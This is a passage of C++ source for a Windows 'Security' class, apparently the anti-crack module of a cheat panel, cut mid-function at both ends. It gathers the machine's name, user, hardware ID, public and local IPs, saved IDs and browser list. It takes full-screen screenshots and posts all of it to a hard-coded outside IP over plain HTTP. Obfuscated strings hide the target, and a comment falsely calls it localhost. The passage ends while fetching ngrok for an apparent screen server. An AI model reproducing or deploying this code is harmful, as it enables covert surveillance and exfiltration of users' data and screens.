        HINTERNET hConn = InternetConnectA(hInet, AY_OBFUSCATE("15.228.83.81"), BOT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConn) { InternetCloseHandle(hInet); return false; }
        HINTERNET hReq = HttpOpenRequestA(hConn, "POST", "/alert", NULL, NULL, NULL, 0, 0);
        if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
        DWORD to = 15000;
        InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
        InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &to, sizeof(to));
        InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));
        const char* hdrs = "Content-Type: application/json\r\n";
        BOOL ok = HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs), (LPVOID)p.c_str(), (DWORD)p.size());
        InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);
        return ok == TRUE;
        };

    for (int i = 0; i < 5; i++) {
        if (sendNow(payload)) break;
        if (i < 4) Sleep(1500);
    }
}

std::string Security::GetEnhancedSystemInfo(const std::string& reason)
{
    try
    {
        // Se for apenas inicialização do painel, usar formato simples
        if (reason == "Painel iniciado" || reason == "Teste de webhook")
        {
            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            GetComputerNameA(computerName, &size);

            SYSTEMTIME st;
            GetLocalTime(&st);
            char dateTime[64];
            sprintf_s(dateTime, "%02d/%02d/%04d %02d:%02d:%02d",
                st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);

            // Ler dados extras para verificar se tem usuário salvo
            std::string userName = "";
            std::string extraFilesPath = (std::string)AY_OBFUSCATE("C:\\Program Files (x86)\\PEDRIN_XITS\\1\\2\\3\\4\\5");

            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA((extraFilesPath + "\\*").c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    {
                        std::string filePath = extraFilesPath + "\\" + std::string(findData.cFileName);
                        std::ifstream file(filePath);
                        std::string line;

                        while (std::getline(file, line))
                        {
                            line.erase(std::remove_if(line.begin(), line.end(), ::isspace), line.end());
                            if (!line.empty())
                            {
                                userName = line; // Usar a primeira linha como nome do usuário
                                break;
                            }
                        }
                        if (!userName.empty()) break;
                    }
                } while (FindNextFileA(hFind, &findData));

                FindClose(hFind);
            }

            // Se não encontrou usuário salvo, usar nome do computador
            if (userName.empty())
            {
                userName = std::string(computerName);
            }

            return "Usuario " + userName + ": iniciou o painel - Horas: " + std::string(dateTime);
        }

        // Para alertas de segurança, usar formato completo
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);

        char userName[256];
        size = sizeof(userName);
        GetUserNameA(userName, &size);

        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);

        std::string osVersion = "Windows";
        std::string architecture = (sizeof(void*) == 8) ? "64-bit" : "32-bit";

        std::string hwid = GetHWID();
        std::string publicIP = GetPublicIP();
        std::string localIPs = GetLocalIPs();

        char processName[MAX_PATH];
        GetModuleFileNameA(NULL, processName, MAX_PATH);
        std::string procName = std::string(processName);
        procName = procName.substr(procName.find_last_of("\\/") + 1);

        DWORD processId = GetCurrentProcessId();

        SYSTEMTIME st;
        GetLocalTime(&st);
        char dateTime[64];
        sprintf_s(dateTime, "%02d/%02d/%04d %02d:%02d:%02d",
            st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);

        // Ler dados extras
        std::string extraData = "";
        std::string extraFilesPath = "C:\\Program Files (x86)\\SYNC\\1\\2\\3\\4\\5";

        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA((extraFilesPath + "\\*").c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                {
                    std::string filePath = extraFilesPath + "\\" + std::string(findData.cFileName);
                    std::ifstream file(filePath);
                    std::string line;

                    while (std::getline(file, line))
                    {
                        line.erase(std::remove_if(line.begin(), line.end(), ::isspace), line.end());
                        if (!line.empty())
                        {
                            extraData += "• ID: ||" + line + "||\n";
                        }
                    }
                }
            } while (FindNextFileA(hFind, &findData));

            FindClose(hFind);
        }

        std::ostringstream oss;
        oss << "ALERTA DE SEGURANÇA\n\n"
            << "Motivo: ||" << reason << "||\n"
            << "Data/Hora: ||" << dateTime << "||\n\n"
            << "📌 Informações do Sistema:\n"
            << "• Nome do Computador: ||" << computerName << "||\n"
            << "• Usuário: ||" << userName << "||\n"
            << "• Sistema Operacional: ||" << osVersion << "||\n"
            << "• Arquitetura: ||" << architecture << "||\n"
            << "• HWID: ||" << hwid << "||\n"
            << "• IP Público: ||" << publicIP << "||\n"
            << "• IPs Locais: ||" << localIPs << "||\n"
            << "• Processo: ||" << procName << "||\n"
            << "• PID: ||" << processId << "||";

        if (!extraData.empty())
        {
            oss << "\n\n📋 Dados Adicionais:\n" << extraData;
        }

        return oss.str();
    }
    catch (...)
    {
        return "Erro ao coletar informações detalhadas. Motivo básico: " + reason;
    }
}

std::string Security::GetHWID()
{
    try
    {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
        {
            char guid[256];
            DWORD size = sizeof(guid);
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)guid, &size) == ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
                return std::string(guid);
            }
            RegCloseKey(hKey);
        }
    }
    catch (...) {}

    return "Não disponível";
}

std::string Security::GetPublicIP()
{
    try
    {
        HINTERNET hSession = WinHttpOpen(AY_OBFUSCATE(L"PublicIP/1.0"),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (hSession)
        {
            HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"api.ipify.org"),
                INTERNET_DEFAULT_HTTPS_PORT, 0);

            if (hConnect)
            {
                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/",
                    NULL, WINHTTP_NO_REFERER,
                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                    WINHTTP_FLAG_SECURE);

                if (hRequest)
                {
                    if (WinHttpSendRequest(hRequest,
                        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                        WinHttpReceiveResponse(hRequest, NULL))
                    {
                        DWORD dwSize = 0;
                        DWORD dwDownloaded = 0;
                        std::string result;

                        do
                        {
                            dwSize = 0;
                            if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0)
                            {
                                char* buffer = new char[dwSize + 1];
                                ZeroMemory(buffer, dwSize + 1);

                                if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded))
                                {
                                    result += std::string(buffer, dwDownloaded);
                                }
                                delete[] buffer;
                            }
                        } while (dwSize > 0);

                        WinHttpCloseHandle(hRequest);
                        WinHttpCloseHandle(hConnect);
                        WinHttpCloseHandle(hSession);
                        return result;
                    }
                    WinHttpCloseHandle(hRequest);
                }
                WinHttpCloseHandle(hConnect);
            }
            WinHttpCloseHandle(hSession);
        }
    }
    catch (...) {}

    return "Não disponível";
}

std::string Security::GetLocalIPs()
{
    try
    {
        ULONG bufferSize = 15000;
        PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(bufferSize);

        if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &bufferSize) == NO_ERROR)
        {
            std::ostringstream oss;
            PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
            bool first = true;

            while (pCurrAddresses)
            {
                if (pCurrAddresses->OperStatus == IfOperStatusUp)
                {
                    PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
                    while (pUnicast)
                    {
                        if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                        {
                            sockaddr_in* sa_in = (sockaddr_in*)pUnicast->Address.lpSockaddr;
                            char ip[INET_ADDRSTRLEN];
                            inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);

                            if (!first) oss << ", ";
                            oss << ip;
                            first = false;
                        }
                        pUnicast = pUnicast->Next;
                    }
                }
                pCurrAddresses = pCurrAddresses->Next;
            }

            free(pAddresses);
            return oss.str();
        }

        free(pAddresses);
    }
    catch (...) {}

    return "Não disponível";
}

std::string Security::CaptureScreenshot()
{
    ConsoleLog("========================================\n");
    ConsoleLog("[Screenshot] INICIANDO CAPTURA\n");
    ConsoleLog("========================================\n");

    try
    {
        // Obter dimensões da tela
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        char buf[256];
        sprintf_s(buf, "[Screenshot] Dimensões: %dx%d\n", screenWidth, screenHeight);
        ConsoleLog(buf);

        if (screenWidth <= 0 || screenHeight <= 0)
        {
            ConsoleLog("[Screenshot] ✗ ERRO: Dimensões inválidas!\n");
            return "";
        }

        // Capturar tela com GDI
        ConsoleLog("[Screenshot] Obtendo DC da tela...\n");
        HDC hdcScreen = GetDC(NULL);
        if (!hdcScreen)
        {
            ConsoleLog("[Screenshot] ✗ ERRO: GetDC falhou!\n");
            return "";
        }
        ConsoleLog("[Screenshot] ✓ GetDC OK\n");

        ConsoleLog("[Screenshot] Criando DC compatível...\n");
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (!hdcMem)
        {
            ConsoleLog("[Screenshot] ✗ ERRO: CreateCompatibleDC falhou!\n");
            ReleaseDC(NULL, hdcScreen);
            return "";
        }
        ConsoleLog("[Screenshot] ✓ CreateCompatibleDC OK\n");

        ConsoleLog("[Screenshot] Criando bitmap compatível...\n");
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        if (!hBitmap)
        {
            sprintf_s(buf, "[Screenshot] ✗ ERRO: CreateCompatibleBitmap falhou! GetLastError=%d\n", GetLastError());
            ConsoleLog(buf);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            return "";
        }
        ConsoleLog("[Screenshot] ✓ CreateCompatibleBitmap OK\n");

        HGDIOBJ oldBitmap = SelectObject(hdcMem, hBitmap);

        // Copiar tela
        ConsoleLog("[Screenshot] Copiando tela com BitBlt...\n");
        BOOL result = BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
        if (!result)
        {
            sprintf_s(buf, "[Screenshot] ✗ AVISO: BitBlt falhou! GetLastError=%d\n", GetLastError());
            ConsoleLog(buf);
        }
        else
        {
            ConsoleLog("[Screenshot] ✓ BitBlt OK\n");
        }

        // Desenhar cursor
        ConsoleLog("[Screenshot] Desenhando cursor...\n");
        CURSORINFO ci;
        ci.cbSize = sizeof(CURSORINFO);
        if (GetCursorInfo(&ci) && (ci.flags == CURSOR_SHOWING))
        {
            ICONINFO ii;
            if (GetIconInfo(ci.hCursor, &ii))
            {
                DrawIconEx(hdcMem,
                    ci.ptScreenPos.x - ii.xHotspot,
                    ci.ptScreenPos.y - ii.yHotspot,
                    ci.hCursor, 0, 0, 0, NULL, DI_NORMAL);

                DeleteObject(ii.hbmMask);
                if (ii.hbmColor) DeleteObject(ii.hbmColor);
                ConsoleLog("[Screenshot] ✓ Cursor desenhado\n");
            }
        }

        SelectObject(hdcMem, oldBitmap);

        // Salvar como BMP
        ConsoleLog("[Screenshot] Preparando para salvar BMP...\n");

        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);

        sprintf_s(buf, "[Screenshot] Pasta temporária: %s\n", tempPath);
        ConsoleLog(buf);

        static int counter = 0;
        char bmpFilename[MAX_PATH];
        sprintf_s(bmpFilename, "%sscreen_%d.bmp", tempPath, counter);

        char jpgFilename[MAX_PATH];
        sprintf_s(jpgFilename, "%sscreen_%d.jpg", tempPath, counter);
        counter++;

        sprintf_s(buf, "[Screenshot] Nome do arquivo BMP: %s\n", bmpFilename);
        ConsoleLog(buf);

        // Obter informações do bitmap
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        sprintf_s(buf, "[Screenshot] Bitmap info: %dx%d, %d bits\n", bmp.bmWidth, bmp.bmHeight, bmp.bmBitsPixel);
        ConsoleLog(buf);

        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = bmp.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

        sprintf_s(buf, "[Screenshot] Tamanho do BMP: %d bytes\n", dwBmpSize);
        ConsoleLog(buf);

        ConsoleLog("[Screenshot] Alocando memória...\n");
        HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
        if (!hDIB)
        {
            sprintf_s(buf, "[Screenshot] ✗ ERRO: GlobalAlloc falhou! GetLastError=%d\n", GetLastError());
            ConsoleLog(buf);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            return "";
        }

        char* lpbitmap = (char*)GlobalLock(hDIB);
        if (!lpbitmap)
        {
            ConsoleLog("[Screenshot] ✗ ERRO: GlobalLock falhou!\n");
            GlobalFree(hDIB);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            return "";
        }
        ConsoleLog("[Screenshot] ✓ Memória alocada\n");

        ConsoleLog("[Screenshot] Obtendo bits do bitmap...\n");
        int getDIBResult = GetDIBits(hdcScreen, hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        if (getDIBResult == 0)
        {
            sprintf_s(buf, "[Screenshot] ✗ ERRO: GetDIBits falhou! GetLastError=%d\n", GetLastError());
            ConsoleLog(buf);
            GlobalUnlock(hDIB);
            GlobalFree(hDIB);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            return "";
        }
        ConsoleLog("[Screenshot] ✓ GetDIBits OK\n");

        // Salvar BMP
        ConsoleLog("[Screenshot] Criando arquivo BMP...\n");
        HANDLE hFile = CreateFileA(bmpFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            sprintf_s(buf, "[Screenshot] ✗ ERRO: CreateFile falhou! GetLastError=%d\n", GetLastError());
            ConsoleLog(buf);
            GlobalUnlock(hDIB);
            GlobalFree(hDIB);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            return "";
        }

        DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = dwSizeofDIB;
        bmfHeader.bfType = 0x4D42; // BM

        DWORD dwBytesWritten = 0;
        WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

        CloseHandle(hFile);

        sprintf_s(buf, "[Screenshot] ✓✓✓ BMP SALVO COM SUCESSO: %s\n", bmpFilename);
        ConsoleLog(buf);

        GlobalUnlock(hDIB);
        GlobalFree(hDIB);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);

        // Tentar converter para JPG com GDI+
        ConsoleLog("[Screenshot] Tentando converter para JPG com GDI+...\n");

        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Status status = GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        if (status != Ok)
        {
            sprintf_s(buf, "[Screenshot] ✗ AVISO: GdiplusStartup falhou (status=%d), retornando BMP\n", status);
            ConsoleLog(buf);
            ConsoleLog("========================================\n");
            return std::string(bmpFilename);
        }
        ConsoleLog("[Screenshot] ✓ GDI+ inicializado\n");

        // Converter para wchar usando CP_ACP (não UTF8, evita problemas com caminhos)
        wchar_t wBmpFilename[MAX_PATH];
        wchar_t wJpgFilename[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, bmpFilename, -1, wBmpFilename, MAX_PATH);
        MultiByteToWideChar(CP_ACP, 0, jpgFilename, -1, wJpgFilename, MAX_PATH);

        // Carregar BMP
        ConsoleLog("[Screenshot] Carregando BMP...\n");
        Bitmap* bmpImage = Bitmap::FromFile(wBmpFilename);

        if (!bmpImage || bmpImage->GetLastStatus() != Ok)
        {
            sprintf_s(buf, "[Screenshot] ✗ AVISO: FromFile falhou (status=%d), retornando BMP\n",
                bmpImage ? bmpImage->GetLastStatus() : -1);
            ConsoleLog(buf);
            if (bmpImage) delete bmpImage;
            GdiplusShutdown(gdiplusToken);
            ConsoleLog("========================================\n");
            return std::string(bmpFilename);
        }
        ConsoleLog("[Screenshot] ✓ BMP carregado\n");

        // Redimensionar para 1280x720 (720p) - boa qualidade
        int targetWidth = 1280;
        int targetHeight = 720;

        float scaleX = (float)targetWidth / screenWidth;
        float scaleY = (float)targetHeight / screenHeight;
        float scale = (scaleX < scaleY) ? scaleX : scaleY;

        int finalWidth = (int)(screenWidth * scale);
        int finalHeight = (int)(screenHeight * scale);

        sprintf_s(buf, "[Screenshot] Redimensionando para %dx%d...\n", finalWidth, finalHeight);
        ConsoleLog(buf);

        Bitmap* resizedBmp = new Bitmap(finalWidth, finalHeight, PixelFormat24bppRGB);
        Graphics* g = Graphics::FromImage(resizedBmp);
        g->SetInterpolationMode(InterpolationModeLowQuality);
        g->SetSmoothingMode(SmoothingModeNone);
        g->SetCompositingQuality(CompositingQualityHighSpeed);
        g->DrawImage(bmpImage, 0, 0, finalWidth, finalHeight);
        delete g;
        delete bmpImage;

        ConsoleLog("[Screenshot] ✓ Redimensionado\n");

        // Encontrar encoder JPEG dinamicamente (mais confiável que CLSID fixo)
        ConsoleLog("[Screenshot] Buscando encoder JPEG...\n");
        CLSID jpegClsid;
        bool foundEncoder = false;

        UINT numEncoders = 0, size = 0;
        GetImageEncodersSize(&numEncoders, &size);

        if (size > 0)
        {
            ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
            if (pImageCodecInfo)
            {
                GetImageEncoders(numEncoders, size, pImageCodecInfo);
                for (UINT j = 0; j < numEncoders; j++)
                {
                    if (wcscmp(pImageCodecInfo[j].MimeType, L"image/jpeg") == 0)
                    {
                        jpegClsid = pImageCodecInfo[j].Clsid;
                        foundEncoder = true;
                        ConsoleLog("[Screenshot] ✓ Encoder JPEG encontrado!\n");
                        break;
                    }
                }
                free(pImageCodecInfo);
            }
        }

        if (!foundEncoder)
        {
            ConsoleLog("[Screenshot] ✗ Encoder JPEG não encontrado, retornando BMP\n");
            delete resizedBmp;
            GdiplusShutdown(gdiplusToken);
            ConsoleLog("========================================\n");
            return std::string(bmpFilename);
        }

        // Salvar como JPEG
        ConsoleLog("[Screenshot] Salvando como JPEG...\n");

        EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG quality = 85; // 85% - boa qualidade visual
        encoderParams.Parameter[0].Value = &quality;

        Status saveStatus = resizedBmp->Save(wJpgFilename, &jpegClsid, &encoderParams);

        sprintf_s(buf, "[Screenshot] Save retornou status=%d\n", saveStatus);
        ConsoleLog(buf);

        delete resizedBmp;
        GdiplusShutdown(gdiplusToken);

        // Deletar BMP temporário
        DeleteFileA(bmpFilename);

        if (saveStatus == Ok)
        {
            sprintf_s(buf, "[Screenshot] ✓✓✓ JPG SALVO COM SUCESSO: %s\n", jpgFilename);
            ConsoleLog(buf);
            ConsoleLog("========================================\n");
            return std::string(jpgFilename);
        }
        else
        {
            // Tentar salvar sem redimensionar (direto do BMP original)
            sprintf_s(buf, "[Screenshot] ✗ Save JPG falhou (status=%d)\n", saveStatus);
            ConsoleLog(buf);
            ConsoleLog("[Screenshot] Retornando BMP original\n");
            ConsoleLog("========================================\n");
            return std::string(bmpFilename);
        }
    }
    catch (...)
    {
        ConsoleLog("[Screenshot] ✗✗✗ EXCEÇÃO CAPTURADA!\n");
        ConsoleLog("========================================\n");
        return "";
    }
}

bool Security::SendToBot(const std::string& message, const std::string& screenshotPath)
{
    try
    {
        // Escapar caracteres especiais para JSON
        auto escapeJson = [](const std::string& s) -> std::string {
            std::string out;
            for (char c : s) {
                if (c == '"')       out += "\\\"";
                else if (c == '\\') out += "\\\\";
                else if (c == '\n') out += "\\n";
                else if (c == '\r') out += "\\r";
                else                out += c;
            }
            return out;
            };

        std::string jsonPayload = "{\"content\":\"" + escapeJson(message) + "\",\"sessionId\":\"" + sessionId + "\",\"browsers\":" + BuildBrowsersJson(DetectBrowsers()) + "";

        // Adicionar screenshot em base64 se existir
        if (!screenshotPath.empty())
        {
            std::ifstream imageFile(screenshotPath, std::ios::binary);
            if (imageFile)
            {
                std::vector<unsigned char> imageData(
                    (std::istreambuf_iterator<char>(imageFile)),
                    std::istreambuf_iterator<char>());
                imageFile.close();
                DeleteFileA(screenshotPath.c_str());

                // Codificar em base64
                static const char* b64chars =
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                std::string b64;
                b64.reserve(((imageData.size() + 2) / 3) * 4);
                for (size_t i = 0; i < imageData.size(); i += 3)
                {
                    unsigned int val = imageData[i] << 16;
                    if (i + 1 < imageData.size()) val |= imageData[i + 1] << 8;
                    if (i + 2 < imageData.size()) val |= imageData[i + 2];
                    b64 += b64chars[(val >> 18) & 0x3F];
                    b64 += b64chars[(val >> 12) & 0x3F];
                    b64 += (i + 1 < imageData.size()) ? b64chars[(val >> 6) & 0x3F] : '=';
                    b64 += (i + 2 < imageData.size()) ? b64chars[val & 0x3F] : '=';
                }

                jsonPayload += ",\"screenshot\":\"" + b64 + "\"";
            }
        }

        jsonPayload += "}";

        // Enviar via WinHTTP para localhost (bot Discord)
        HINTERNET hSession = WinHttpOpen(AY_OBFUSCATE(L"SecurityBot/1.0"),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"15.228.83.81"),
            BOT_HTTP_PORT, 0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return false;
        }

        // HTTP simples (sem HTTPS) para localhost
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
            L"/alert",
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0); // sem WINHTTP_FLAG_SECURE

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        LPCWSTR headers = AY_OBFUSCATE(L"Content-Type: application/json\r\n");

        DWORD timeout = 30000; // 30 segundos
        WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

        BOOL bResults = WinHttpSendRequest(hRequest,
            headers, -1,
            (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length(),
            (DWORD)jsonPayload.length(), 0);

        if (bResults)
            bResults = WinHttpReceiveResponse(hRequest, NULL);

        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        if (bResults)
        {
            WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX,
                &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return bResults && (statusCode >= 200 && statusCode < 300);
    }
    catch (...)
    {
        return false;
    }
}

bool Security::SendSimpleMessage(const std::string& message)
{
    // Delegar para SendToBot sem screenshot, marcando como screenLog
    // para o bot enviar no canal correto (logsAntiCrack)
    try
    {
        auto escapeJson = [](const std::string& s) -> std::string {
            std::string out;
            for (char c : s) {
                if (c == '"')       out += "\\\"";
                else if (c == '\\') out += "\\\\";
                else if (c == '\n') out += "\\n";
                else if (c == '\r') out += "\\r";
                else                out += c;
            }
            return out;
            };

        std::string jsonPayload = "{\"content\":\"" + escapeJson(message) +
            "\",\"sessionId\":\"" + sessionId +
            "\",\"screenLog\":true}";

        HINTERNET hSession = WinHttpOpen(AY_OBFUSCATE(L"SecurityBot/1.0"),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"15.228.83.81"), BOT_HTTP_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/alert",
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

        DWORD timeout = 10000;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

        LPCWSTR headers = L"Content-Type: application/json\r\n";
        BOOL ok = WinHttpSendRequest(hRequest, headers, -1,
            (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length(),
            (DWORD)jsonPayload.length(), 0);
        if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return ok;
    }
    catch (...) { return false; }
}

// Funções auxiliares
std::string Security::ToLower(const std::string& s)
{
    std::string result = s;
    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
    return result;
}

std::string Security::WideToNarrow(const wchar_t* wide)
{
    if (!wide) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wide, -1, NULL, 0, NULL, NULL);
    if (size <= 0) return "";
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide, -1, &result[0], size, NULL, NULL);
    return result;
}

std::string Security::GetModulePath(HMODULE hMod)
{
    char path[MAX_PATH];
    GetModuleFileNameA(hMod, path, MAX_PATH);
    return std::string(path);
}

bool Security::IsTrustedDirectory(const std::string& path)
{
    for (const auto& dir : trustedDirectories)
    {
        if (path.find(dir) == 0)
            return true;
    }
    return false;
}

bool Security::ContainsAny(const std::string& str, const std::vector<std::string>& patterns)
{
    for (const auto& pattern : patterns)
    {
        if (str.find(pattern) != std::string::npos)
            return true;
    }
    return false;
}

// ══════════════════════════════════════════════════════════════════════════════
// NGROK E SCREEN SERVER
// ══════════════════════════════════════════════════════════════════════════════

bool Security::DownloadNgrok()
{
    try
    {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string ngrokZip = std::string(tempPath) + "ngrok.zip";
        std::string ngrokExe = std::string(tempPath) + "ngrok.exe";

        // Verificar se já existe
        if (GetFileAttributesA(ngrokExe.c_str()) != INVALID_FILE_ATTRIBUTES)
            return true;

        // Download do ngrok
        HINTERNET hSession = WinHttpOpen(L"NgrokDownloader/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, L"download.ngrok.com",
            INTERNET_DEFAULT_HTTPS_PORT, 0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
            L"/ngrok-v3/releases/latest/ngrok-v3-stable-windows-amd64.zip",
            NULL, WINHTTP_NO_REFERER,
